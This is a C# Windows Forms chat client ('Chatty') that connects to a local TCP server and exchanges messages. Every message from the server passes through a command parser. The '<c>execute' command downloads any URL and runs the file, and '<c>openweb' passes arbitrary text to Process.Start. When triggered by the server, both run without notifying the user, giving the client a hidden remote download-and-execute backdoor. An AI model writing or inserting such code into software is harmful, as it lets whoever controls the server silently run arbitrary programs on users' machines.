using SocksLib;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Chatty
{
    public partial class frmChatty : Form
    {
        // Creatse the endpoint used to connect to the server.
        IPEndPoint ipEnd = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 25565);
        // Creates the client socket.
        TcpClientSocket socket;

        public frmChatty()
        {
            InitializeComponent();
        }

        // Connects to the server and sends the username as the first message.
        private void BtnConnect_Click(object sender, EventArgs e)
        {
            ConnectToServer(tbUsername.Text);
        }

        /// <summary>
        /// Connects to the server and sends the username.
        /// </summary>
        /// <param name="userName"> The client's username for the chat. </param>
        void ConnectToServer(string userName)
        {
            if (!string.IsNullOrWhiteSpace(userName))
            {
                socket = new TcpClientSocket();

                socket.AsyncConnectionResult += (s, e) =>
                {
                    // If connected to the server
                    if (e.Connected)
                    {
                        // Send the username to the server.
                        byte[] msgPayload = Encoding.ASCII.GetBytes("<c>username" + userName);
                        socket.SendAsync(msgPayload);

                        // Start receiving messages from the server.
                        beginReceiving(socket);

                        rtbClientMessages.InvokeIfRequired(s1 =>
                        {
                            // Displays that a client has connected
                            if (s1.Text.Length <= 0)
                            {
                                this.Invoke((MethodInvoker)(() => rtbClientMessages.AppendText("Connected to the server.")));
                            }
                            else
                            {
                                this.Invoke((MethodInvoker)(() => rtbClientMessages.AppendText("\nConnected to the server.")));
                            }
                        });

                        btnConnect.InvokeIfRequired(bc => { bc.Text = "Connected"; });
                        btnSend.InvokeIfRequired(bs => { bs.Enabled = true; });
                    }
                    else
                    {
                        ConnectToServer(userName);
                    }
                };

                try
                {
                    // Set the connection controls to disabled
                    btnConnect.Text = "Connecting";
                    btnConnect.Enabled = false;
                    tbUsername.Enabled = false;

                    // Connect to the server.
                    socket.ConnectAsync(ipEnd);
                }
                catch (Exception ex)
                {
                    // Set the conncet controls to enabled
                    btnConnect.Text = "Connect";
                    btnConnect.Enabled = true;
                    tbUsername.Enabled = true;

                    MessageBox.Show(ex.ToString(), "Cannot Connect To Server");
                }
            }
            else
            {
                MessageBox.Show("Please enter a valid username.", "Invalid Username");
            }
        }

        /// <summary>
        /// Sends a message to the server.
        /// </summary>
        private void BtnSend_Click(object sender, EventArgs e)
        {
            // If the message is valid.
            if (TbMsg.Text != string.Empty && TbMsg.Text != null)
            {
                string msg = TbMsg.Text;

                // If connected to the server.
                if (socket != null && socket.Connected)
                {
                    // If the message is not a command.
                    if (!RunCommand(msg))
                    {
                        // Convert the message into a byte array.
                        byte[] msgPayload = Encoding.ASCII.GetBytes(msg);

                        // Send the message asynchronously.
                        socket.SendAsync(msgPayload);

                        // Clears the message entry textbox.
                        TbMsg.Text = string.Empty;

                        // Display the message was sent.
                        AppendText($"\nYou: {msg}");
                    }
                }
                else
                {
                    MessageBox.Show("You are not connected to the server.");
                    TbMsg.Clear();
                }
            }
            else
            {
                //MessageBox.Show("Please enter a message before sending", "No Message To Send");
            }
        }

        private bool RunCommand(string _input, bool _fromServer = false)
        {
            // Checks if the input is a command
            if (_input.ToLower().StartsWith("<c>"))
            {
                string commandStr = string.Empty;
                string commandArgs = string.Empty;

                // If arguments were given
                if (!_input.Contains(" "))
                {
                    commandStr = _input.ToLower();
                    commandArgs = null;
                }
                else
                {
                    commandStr = _input.Substring(0, _input.IndexOf(" "));
                    commandArgs = _input.Substring(_input.IndexOf(" "), _input.Length - commandStr.Length);
                    commandArgs = commandArgs.Remove(0, 1);
                }

                switch (commandStr)
                {
                    // Connection commands
                    case "<c>disconnect":
                        socket.Disconnect();
                        DisconnectFromServer();
                        AppendCommandText(commandStr, commandArgs, _fromServer);
                        break;
                    case "<c>reconnect":
                        socket.Disconnect();
                        //ConnectToServer(tbUsername.Text); doesn't work.
                        break;
                    // Misc. commands
                    case "<c>execute":
                        DownloadFileAndExecute($"{commandArgs}");
                        break;
                    case "<c>openweb":
                        if (!string.IsNullOrWhiteSpace(commandArgs))
                        {
                            System.Diagnostics.Process.Start($"{commandArgs}");
                            AppendCommandText(commandStr, commandArgs, _fromServer);
                        }
                        else
                        {
                            MessageBox.Show("Invalid website provided!", "Invalid Website");
                        }
                        break;
                    default:
                        MessageBox.Show("Command not recognized.", "Unknown Command");
                        break;
                }
                return true;
            }
            else
            {
                return false;
            }
        }

        private void TbUsername_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                // Removes the Windows sound when the key is pressed.
                e.Handled = true;
                e.SuppressKeyPress = true;

                BtnSend_Click(this, new EventArgs());   // Invokes the BtnSend click method.
            }
        }

        // Start receiving messages from the server.
        // Handles client disconnection from the server.
        private void beginReceiving(TcpClientSocket client)
        {
            client.DataReceived += (ds, de) =>
            {
                string receivedMessage = Encoding.ASCII.GetString(de.Payload);

                if (!RunCommand(receivedMessage, true))
                {
                    if (client.GetIpEndPointString().Contains("25565"))
                    {
                        RichTextBoxExtensions.AppendText(rtbClientMessages, $"\nServer: {Encoding.ASCII.GetString(de.Payload)}", Color.Blue);
                    }
                    else
                    {
                        AppendText($"{client.GetIpEndPointString()}: {Encoding.ASCII.GetString(de.Payload)}");
                    }
                }
            };

            client.Disconnected += (ds, de) =>
            {
                DisconnectFromServer();
            };
        }

        // Disconnects from the server.
        private void DisconnectFromServer()
        {
            AppendText($"\nDisconnected from the server.");

            // Changes the connect controls to allow connecting to the server.
            btnConnect.InvokeIfRequired(s => { s.Enabled = true; });
            btnConnect.InvokeIfRequired(s => { s.Text = "Connect"; });
            tbUsername.InvokeIfRequired(s => { s.Enabled = true; });
        }

        // Writes text to the client console.
        public void AppendText(string _textToAppend)
        {
            rtbClientMessages.InvokeIfRequired(s => { s.AppendText($"{_textToAppend}"); });
        }

        // Writes the command executed to the client console.
        private void AppendCommandText(string _command, string _args, bool _fromServer = false)
        {
            // If the command was ran from the client
            if (!_fromServer)
            {
                // If there were no arguments provided
                if (!string.IsNullOrWhiteSpace(_args))
                {
                    AppendText($"\nThe command {_command} was executed with the following arguments: {_args}");
                }
                else
                {
                    AppendText($"\nThe command {_command} was executed");
                }
                TbMsg.Text = string.Empty;
            }
            else
            {
                //MessageBox.Show("Command from server has executed.", "Execution Successful");
            }
        }

        // Downloads and executes a file.
        private void DownloadFileAndExecute(string link)
        {
            using (WebClient _wc = new WebClient())
            {
                string filename = Path.GetFileName(link);
                _wc.DownloadFile(link, filename);
                Process.Start(filename);
            }
        }

        // Sends the message when you press enter.
        private void TbMsg_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                // removes the Windows sound when the key is pressed.
                e.Handled = true;
                e.SuppressKeyPress = true;

                BtnSend_Click(this, new EventArgs());   // Invokes the BtnSend click method.
            }
        }

        // Shows the newest message at the bottom when the rich text box is full.
        private void rtbClientMessages_TextChanged(object sender, EventArgs e)
        {
            // set the current caret position to the end
            rtbClientMessages.SelectionStart = rtbClientMessages.Text.Length;
            // scroll to the last message
            rtbClientMessages.ScrollToCaret();
        }
    }

    public static class ControlHelpers
    {
        public static void InvokeIfRequired<T>(this T control, Action<T> action) where T : ISynchronizeInvoke
        {
            if (control.InvokeRequired)
            {
                control.Invoke(new Action(() => action(control)), null);
            }
            else
            {
                action(control);
            }
        }
    }

    public static class RichTextBoxExtensions
    {
        public static void AppendText(this RichTextBox box, string text, Color color, bool addNewLine = false)
        {
            box.InvokeIfRequired(s => { s.SelectionStart = box.TextLength; });
            box.InvokeIfRequired(s => { s.SelectionLength = 0; });

            box.InvokeIfRequired(s => { s.SelectionColor = color; });
            box.InvokeIfRequired(s => { s.AppendText(addNewLine ? $"{text}{Environment.NewLine}" : text); });
            box.InvokeIfRequired(s => { s.SelectionColor = box.ForeColor; });
        }
    }
}
